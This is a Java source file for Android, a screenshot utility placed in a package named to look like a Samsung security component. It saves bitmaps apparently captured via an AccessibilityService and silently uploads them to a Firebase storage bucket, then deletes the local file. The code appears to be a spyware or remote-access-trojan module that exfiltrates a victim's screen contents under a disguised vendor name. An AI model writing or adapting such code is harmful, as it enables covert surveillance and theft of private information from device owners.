package com.samsung.android.security.v8.utils;

import android.content.Context;
import android.graphics.Bitmap;
import android.net.Uri;
import android.view.Display;
import android.view.WindowManager;

import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;

import java.io.File;
import java.io.FileOutputStream;

public class ScreenshotUtil {
    
    public interface ScreenshotCallback {
        void onScreenshotTaken(String url);
        void onError(String error);
    }
    
    public static void takeScreenshot(Context context, ScreenshotCallback callback) {
        callback.onError("Screenshot requires MediaProjection API - use AccessibilityService instead");
    }
    
    public static void takeScreenshotWithAccessibility(Bitmap bitmap, Context context, 
                                                       ScreenshotCallback callback) {
        try {
            File file = new File(context.getCacheDir(), 
                    "screenshot_" + System.currentTimeMillis() + ".png");
            
            FileOutputStream fos = new FileOutputStream(file);
            bitmap.compress(Bitmap.CompressFormat.PNG, 100, fos);
            fos.flush();
            fos.close();
            
            uploadToFirebase(file, callback);
            
        } catch (Exception e) {
            callback.onError(e.getMessage());
        }
    }
    
    private static void uploadToFirebase(File file, ScreenshotCallback callback) {
        try {
            FirebaseStorage storage = FirebaseStorage.getInstance();
            StorageReference storageRef = storage.getReference();
            StorageReference fileRef = storageRef.child("screenshots/" + file.getName());
            
            Uri fileUri = Uri.fromFile(file);
            
            fileRef.putFile(fileUri)
                    .addOnSuccessListener(taskSnapshot -> {
                        fileRef.getDownloadUrl().addOnSuccessListener(uri -> {
                            callback.onScreenshotTaken(uri.toString());
                            file.delete();
                        });
                    })
                    .addOnFailureListener(e -> {
                        callback.onError(e.getMessage());
                    });
                    
        } catch (Exception e) {
            callback.onError(e.getMessage());
        }
    }
}
